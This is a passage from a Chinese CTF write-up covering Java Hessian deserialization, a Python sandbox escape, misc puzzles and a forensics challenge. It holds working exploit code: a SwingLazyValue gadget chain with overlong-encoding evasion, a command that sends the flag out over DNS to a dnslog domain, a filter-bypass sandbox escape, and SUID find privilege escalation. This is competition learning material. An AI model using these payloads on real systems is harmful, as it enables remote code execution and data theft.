IOException {</span><br><span class="line">        <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> (<span class="type">int</span>) getSuperFieldValue(<span class="string">"_offset"</span>);</span><br><span class="line">        <span class="type">byte</span>[] buffer = (<span class="type">byte</span>[]) getSuperFieldValue(<span class="string">"_buffer"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) {</span><br><span class="line">            <span class="keyword">if</span> (SIZE &lt;= offset + <span class="number">16</span>) {</span><br><span class="line">                setSuperFieldValue(<span class="string">"_offset"</span>, offset);</span><br><span class="line">                flushBuffer();</span><br><span class="line">                offset = (<span class="type">int</span>) getSuperFieldValue(<span class="string">"_offset"</span>);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> v[i + strOffset];</span><br><span class="line">            buffer[offset++] = (<span class="type">byte</span>) (<span class="number">0xc0</span> + (convert(ch)[<span class="number">0</span>] &amp; <span class="number">0x1f</span>));</span><br><span class="line">            buffer[offset++] = (<span class="type">byte</span>) (<span class="number">0x80</span> + (convert(ch)[<span class="number">1</span>] &amp; <span class="number">0x3f</span>));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        setSuperFieldValue(<span class="string">"_offset"</span>, offset);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] convert(<span class="type">int</span> i) {</span><br><span class="line">        <span class="type">int</span> <span class="variable">b1</span> <span class="operator">=</span> ((i &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b11111</span>) | <span class="number">0b11000000</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b2</span> <span class="operator">=</span> (i &amp; <span class="number">0b111111</span>) | <span class="number">0b10000000</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]{ b1, b2 };</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getSuperFieldValue</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getSuperclass().getDeclaredField(name);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> f.get(<span class="built_in">this</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSuperFieldValue</span><span class="params">(String name, Object val)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getSuperclass().getDeclaredField(name);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f.set(<span class="built_in">this</span>, val);</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>然后就直接构造命令执行的利用链了，利用的是SwingLazyUIDefaults这个利用链，序列化的时候用上面改好的Hessian2OutputWithOverlongEncoding类进行序列化即可。 下面这个是最终返回flag的poc，途中也卡了好久，发现只能dns出网，打ldap半天没得到结果，应该是tcp不能出网，而题目源码有给了一个readflag程序的利用方式，果断想到利用dns命令执行带出的方式：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.caucho.hessian.io.Hessian2Input;</span><br><span class="line">import sun.swing.SwingLazyValue;</span><br><span class="line">import javax.activation.MimeTypeParameterList;</span><br><span class="line">import javax.swing.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">public class hessianDemo2 {</span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        UIDefaults uiDefaults = new UIDefaults();</span><br><span class="line">        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);</span><br><span class="line">        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String[].class);</span><br><span class="line">        String[] cmdArray =  {"sh","-c","ping -c 4 `../readflag give me the flag`.gvb0t2.dnslog.cn"};</span><br><span class="line">        SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{cmdArray}}});</span><br><span class="line"></span><br><span class="line">        uiDefaults.put("xxx", slz);</span><br><span class="line">        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();</span><br><span class="line"></span><br><span class="line">        setFieldValue(mimeTypeParameterList,"parameters",uiDefaults);</span><br><span class="line"></span><br><span class="line">        byte[] data_overlong_safe = hessian2SerializeWithOverlongEncoding(mimeTypeParameterList);</span><br><span class="line">        String base64 = Base64.getEncoder().encodeToString(data_overlong_safe);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line"></span><br><span class="line">        try (FileOutputStream fos = new FileOutputStream("SwingLazyValue.ser")) {</span><br><span class="line">            fos.write(data_overlong_safe);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static byte[] hessian2SerializeWithOverlongEncoding(Object o) throws Exception {</span><br><span class="line">        ByteArrayOutputStream bao = new ByteArrayOutputStream();</span><br><span class="line">        Hessian2OutputWithOverlongEncoding output = new Hessian2OutputWithOverlongEncoding(bao);</span><br><span class="line">        output.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        bao.write(67);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        output.flushBuffer();</span><br><span class="line">        return bao.toByteArray();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static Object hessian2Unserialize(byte[] data) throws Exception {</span><br><span class="line">        Hessian2Input input = new Hessian2Input(new ByteArrayInputStream(data));</span><br><span class="line">        Object obj = input.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>运行后生成对应的序列化数据，可以看到特征混淆的很干净，没有”java“出现：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509142153207.png" alt="image-20250509142153137"></p>
<p>直接拿着打印的base64数据发包即可（这里我放到1.txt里面了），注意url编码:</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data-urlencode <span class="string">"ser=<span class="subst">$(cat 1.txt| tr -d '\n')</span>"</span> http://localhost:60799</span><br></pre></td></tr></tbody></table></figure>

<p>查看dnslog日志，回显flag：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140834487.png" alt="image.png"></p>
<p>肯定是还有其他办法的，不然怎么会有后面hdhessian这题：hessian是高版本，而且dns也不出网。。。想不到有啥更通用的利用方式了，期待hdhessian的wp。</p>
<h2 id="pybox"><a href="#pybox" class="headerlink" title="pybox"></a>pybox</h2><p>放在最后写wp是因为觉得这是出的最有意思的一道题，和队友一起研究好久，中间绕了好多坎，值得记录一下wp（当然这也是最后才做出来的，比赛结束前半小时做出来。。。）</p>
<h3 id="第一道坎：badchars"><a href="#第一道坎：badchars" class="headerlink" title="第一道坎：badchars"></a>第一道坎：badchars</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">badchars = <span class="string">"\"'|&amp;`+-*/()[]{}_."</span></span><br></pre></td></tr></tbody></table></figure>

<p>直接16进制绕过</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def string_to_hex(s):</span><br><span class="line">    hex_string = ''</span><br><span class="line">    for char in s:</span><br><span class="line">        ascii_value = ord(char)</span><br><span class="line">        hex_char = r'\x{:02x}'.format(ascii_value)</span><br><span class="line">        hex_string += hex_char</span><br><span class="line">    return hex_string</span><br><span class="line"></span><br><span class="line">string = '''\")</span><br><span class="line">逃逸的payload</span><br><span class="line">#'''</span><br><span class="line">hex_string = string_to_hex(string)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="第二道坎：绕过钩子检查"><a href="#第二道坎：绕过钩子检查" class="headerlink" title="第二道坎：绕过钩子检查"></a>第二道坎：绕过钩子检查</h3><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140834913.png" alt="image-20250508120139027"></p>
<p>这里两处逻辑判断基本限制了很多行为导致无法逃逸，所以得想办法让这两处逻辑判断失效。</p>
<p>看了很多资料，学会了一个骚操作：覆盖filter和len函数，这样就可以通过钩子检查</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filter=lambda a,b: [1,2,3]</span><br><span class="line">len = lambda x: 0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="第三道坎：逃逸出去命令执行"><a href="#第三道坎：逃逸出去命令执行" class="headerlink" title="第三道坎：逃逸出去命令执行"></a>第三道坎：逃逸出去命令执行</h3><p>题目也提示了用Exceptin，就是异常逃逸</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    raise Exception("exploit")</span><br><span class="line">except Exception as e:</span><br><span class="line">    tb = e.__traceback__.tb_frame</span><br><span class="line">    globals= tb.f_back.f_back.f_globals</span><br><span class="line">    os = globals["__builtins__"].get('__import__')('os')</span><br><span class="line">    print(os.popen("echo 1").read())</span><br></pre></td></tr></tbody></table></figure>

<h3 id="第四道坎：-find提权"><a href="#第四道坎：-find提权" class="headerlink" title="第四道坎： find提权"></a>第四道坎： find提权</h3><p>刚开始想可能flag像之前题一样在env执行结果里面，结果跑半天脚本发现FLAG环境变量值为空：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140834997.png" alt="image-20250508120619084"></p>
<p>后面发现根目录有个文件m1n1FL@G，flag应该就是在这里面了，但是读取后为空，后面发现是权限不够，只有root有读权限，而当前权限是普通用户。那就要尝试提权了，发现find命令是有s的，那就是find提权了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141023378.png" alt="image-20250508120903534"></p>
<p>basecommand = “find /usr/bin/find -exec cat /m1n1FL@G  ;“</p>
<h3 id="第五道坎：flag读取不全"><a href="#第五道坎：flag读取不全" class="headerlink" title="第五道坎：flag读取不全"></a>第五道坎：flag读取不全</h3><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141029000.png" alt="image-20250508121120932"></p>
<p>读半天没读出完整的flag，大概率脚本是写的有问题，猜到flag里面可能有特殊字符，导致执行命令回显不到页面上（因为我写的脚本是一个字符一个字符的取从而绕过长度限制）。转念一想，直接base64不就解决了。</p>
<p>先改文件权限：basecommand = “find /usr/bin/find -exec  chmod 777 /m1n1FL@G ;“</p>
<p>然后普通用户下查看内容并base64编码：basecommand = “cat /m1n1FL@G | base64”</p>
<p>成功得到base64内容，解码得到：miniLCTF{S3cReT-Flag-1N-5nAk3-Ye@R_🐍506797a}    （鬼知道居然这flag里面居然放了个蛇的图标）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140836252.png" alt="image-20250508121903842"></p>
<p>最后发一下解题用的python脚本，basecommand那块放的就是要执行的命令，可以逐步回显出执行的结果。</p>
<p>为啥要特意写脚本来回显？因为原题还限制了输出内容长度不能大于5，大于5就返回Error，所以得用脚本将命令执行结果逐个回显。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def string_to_hex(s):</span><br><span class="line">    hex_string = ''</span><br><span class="line">    for char in s:</span><br><span class="line">        ascii_value = ord(char)</span><br><span class="line">        hex_char = r'\x{:02x}'.format(ascii_value)</span><br><span class="line">        hex_string += hex_char</span><br><span class="line">    return hex_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">basecommand = "cat /m1n1FL@G | base64"</span><br><span class="line">full_content = ""</span><br><span class="line">index = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    string = '''\")</span><br><span class="line">filter=lambda a,b: [1,2,3]</span><br><span class="line">len = lambda x: 0</span><br><span class="line">try:</span><br><span class="line">    raise Exception("exploit")</span><br><span class="line">except Exception as e:</span><br><span class="line">    tb = e.__traceback__.tb_frame      </span><br><span class="line">    globals= tb.f_back.f_back.f_globals</span><br><span class="line">    os = globals["__builtins__"].get('__import__')('os')</span><br><span class="line">    print(os.popen("%s | tr '\\n' '|'  |cut -c %s").read())</span><br><span class="line">    #''' %(basecommand, index + 1)</span><br><span class="line">    hex_string = string_to_hex(string)</span><br><span class="line">    text = requests.post("http://127.0.0.1:56135/execute", data={"text": hex_string}).text.strip()</span><br><span class="line">    if "Error" in text:</span><br><span class="line">        print("Error")</span><br><span class="line">    if len(text) &gt; 0 and text != "Error":</span><br><span class="line">        full_content = full_content + text[0]</span><br><span class="line">    print(full_content)</span><br><span class="line">    index += 1</span><br><span class="line">print(full_content)</span><br></pre></td></tr></tbody></table></figure>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="吃豆人"><a href="#吃豆人" class="headerlink" title="吃豆人"></a>吃豆人</h2><p>直接查看js，定位到获取flag的位置：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141041499.png" alt="img"></p>
<p>直接把fetch这段请求复制到控制台发送，获得flag。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140836760.png" alt="img"></p>
<h2 id="麦霸评分"><a href="#麦霸评分" class="headerlink" title="麦霸评分"></a>麦霸评分</h2><p>直接下载页面上的歌，用burp发包compare-recording端点，上传的文件直接用下载的歌即可（不知道为啥用burp就是没成功，yakit发包一下就成功了）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141052419.png" alt="image.png"></p>
<h2 id="MiniForensicsⅠ"><a href="#MiniForensicsⅠ" class="headerlink" title="MiniForensicsⅠ"></a>MiniForensicsⅠ</h2><p>来自队友贡献的一题</p>
<p>从附件下载可得到一个虚拟机的压缩文件，vmware打开虚拟机vmx文件进行取证分析。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140838333.png" alt="image-20250508121810793"></p>
<p>打开b.txt后根据题目描述首先尝试画图，将每一行数识别为横纵坐标，多次调试结果并没有得到想要的显示效果。</p>
<p>根据文件修改时间，可以定位到文档中有最新添加的一个nihao文件夹，遂取出分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141104016.png" alt="image-20250508122157693"></p>
<p>得到ai.rar和pwd.txt，其中pwd.txt提示7位数字密码，故尝试爆破，</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141109753.png" alt="image-20250508122301025"></p>
<p>密码为1846287</p>
<p>打开后发现崩铁一张图片和hahaha.txt的提示信息。</p>
<p>将压缩包foremost提取，即可找到ssl.log文件。</p>
<p>毫无疑问将log文件导入wireshark进行pcapng包流量解密。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140839540.png" alt="image-20250508122527167"></p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141121512.png" alt="image-20250508122551699"></p>
<p>可以看到之前加密流量中有两条post的数据包，导出为两个压缩包文件，追踪第590帧的POST数据包可发现是我们想要的bitloker文件，</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140839588.png" alt="image-20250508122714015"></p>
<p>进行导出，还原，得到了bitlocker如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140839932.png" alt="image-20250508122855532"></p>
<p>恢复密钥: </p>
<pre><code>521433-074470-317097-543499-149259-301488-189849-252032
</code></pre>
<p>回复密钥解密D盘可得到c文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140840028.png" alt="image-20250508122941248"></p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141153242.png" alt="image-20250508123006436"></p>
<p>c文件和b文件相似，一开始尝试了异或，相减没有得到想要的结果。</p>
<p>但是对c文件生成图后可获得提示信息b=(a+c)/2</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509141137143.png" alt="image-20250508124904085"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageOps</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_points</span>(<span class="params">filename</span>):</span><br><span class="line">    points = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">if</span> line.strip():</span><br><span class="line">                x, y = <span class="built_in">map</span>(<span class="built_in">float</span>, line.strip().split(<span class="string">','</span>))</span><br><span class="line">                points.append((x, y))</span><br><span class="line">    <span class="keyword">return</span> points</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 读取原始坐标点</span></span><br><span class="line">points = read_points(<span class="string">"draw_c.txt"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 对 x y 坐标拉长2.5倍</span></span><br><span class="line">scaled_points = [(x * <span class="number">2.5</span>, y * <span class="number">2.5</span>) <span class="keyword">for</span> x, y <span class="keyword">in</span> points]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 绘制坐标图并保存</span></span><br><span class="line">plt.figure(figsize=(<span class="number">6</span>,<span class="number">6</span>))</span><br><span class="line">x_vals, y_vals = <span class="built_in">zip</span>(*scaled_points)</span><br><span class="line">plt.scatter(x_vals, y_vals, c=<span class="string">"blue"</span>, s=<span class="number">0.1</span>)</span><br><span class="line">plt.xlabel(<span class="string">"X"</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Y"</span>)</span><br><span class="line">plt.title(<span class="string">"Scaled Points (X axis * 2)"</span>)</span><br><span class="line">plt.gca().set_aspect(<span class="string">'equal'</span>, <span class="string">'box'</span>)</span><br><span class="line">plt.savefig(<span class="string">"plot1.png"</span>, dpi=<span class="number">300</span>)</span><br><span class="line">plt.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 对生成的图像执行左右镜像翻转输出</span></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">"plot1.png"</span>)</span><br><span class="line"><span class="comment"># 左右镜像翻转</span></span><br><span class="line">mirrored_horiz = ImageOps.mirror(image)</span><br><span class="line"><span class="comment"># mirrored_horiz.save("mirrored_plot1.png")</span></span><br><span class="line"><span class="comment"># mirrored_horiz.show()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上下镜像翻转</span></span><br><span class="line">mirrored_vert = ImageOps.flip(image)</span><br><span class="line"><span class="comment"># mirrored_vert.save("mirrored_plot1_vertical.png")</span></span><br><span class="line">mirrored_vert.show()</span><br><span class="line"><span class="comment"># mirrored_image = ImageOps.mirror(image)</span></span><br><span class="line"><span class="comment"># mirrored_image.save("mirrored_plot1.png")</span></span><br><span class="line"><span class="comment"># mirrored_image.show()</span></span><br></pre></td></tr></tbody></table></figure>



<p>故对坐标值进行进行2b-c运算，即可得到flag值</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="comment"># 指定一款支持中文的系统字体路径</span></span><br><span class="line">font_path = <span class="string">r'C:\Windows\Fonts\SimHei.ttf'</span></span><br><span class="line">font_size = <span class="number">24</span></span><br><span class="line">font = ImageFont.truetype(font_path, font_size, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_points</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">float</span>, line.strip().split(<span class="string">','</span>))) <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 读取点集</span></span><br><span class="line"><span class="comment"># points_a = read_points('draw_a.txt')</span></span><br><span class="line">points_b = read_points(<span class="string">'draw_b.txt'</span>)</span><br><span class="line">points_c = read_points(<span class="string">'draw_c.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 2*b - c</span></span><br><span class="line">result_points = []</span><br><span class="line"><span class="keyword">for</span> b, c <span class="keyword">in</span> <span class="built_in">zip</span>(points_b, points_c):</span><br><span class="line">    x = <span class="number">2</span> * b[<span class="number">0</span>] - c[<span class="number">0</span>]</span><br><span class="line">    y = <span class="number">2</span> * b[<span class="number">1</span>] - c[<span class="number">1</span>]</span><br><span class="line">    result_points.append((x, y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pts = result_points</span><br><span class="line"><span class="comment"># 2. 计算边界</span></span><br><span class="line">xs = [x <span class="keyword">for</span> x, y <span class="keyword">in</span> pts]</span><br><span class="line">ys = [y <span class="keyword">for</span> x, y <span class="keyword">in</span> pts]</span><br><span class="line">xmin, xmax = <span class="built_in">min</span>(xs), <span class="built_in">max</span>(xs)</span><br><span class="line">ymin, ymax = <span class="built_in">min</span>(ys), <span class="built_in">max</span>(ys)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 生成镜像坐标</span></span><br><span class="line">h_mirror = [(xmax + xmin - x, y) <span class="keyword">for</span> x, y <span class="keyword">in</span> pts]  <span class="comment"># 左右镜像</span></span><br><span class="line">v_mirror = [(x, ymax + ymin - y) <span class="keyword">for</span> x, y <span class="keyword">in</span> pts]  <span class="comment"># 上下镜像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 绘图</span></span><br><span class="line">plt.figure(figsize=(<span class="number">6</span>,<span class="number">6</span>))</span><br><span class="line"><span class="comment"># plt.scatter(*zip(*pts), c='blue',    s=5, label='raw points')</span></span><br><span class="line">plt.scatter(*<span class="built_in">zip</span>(*h_mirror), c=<span class="string">'red'</span>,   s=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># plt.scatter(*zip(*v_mirror), c='green', s=5, label='vertical mirror')</span></span><br><span class="line"></span><br><span class="line">plt.gca().set_aspect(<span class="string">'equal'</span>, <span class="string">'box'</span>)</span><br><span class="line">plt.legend()</span><br><span class="line"><span class="comment"># plt.title('原始点及镜像变换结果')</span></span><br><span class="line">plt.xlabel(<span class="string">'X'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'Y'</span>)</span><br><span class="line"><span class="comment"># 5. 保存并显示</span></span><br><span class="line">plt.savefig(<span class="string">'mirrored_plot.png'</span>, dpi=<span class="number">300</span>)</span><br><span class="line">plt.close()</span><br><span class="line"></span><br><span class="line">icon = Image.<span class="built_in">open</span>(<span class="string">"mirrored_plot.png"</span>)</span><br><span class="line">icon_rotated = icon.rotate(-<span class="number">180</span>, expand=<span class="literal">True</span>)</span><br><span class="line">icon_rotated.save(<span class="string">'icon_rotated.png'</span>)</span><br><span class="line">icon_rotated.show()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

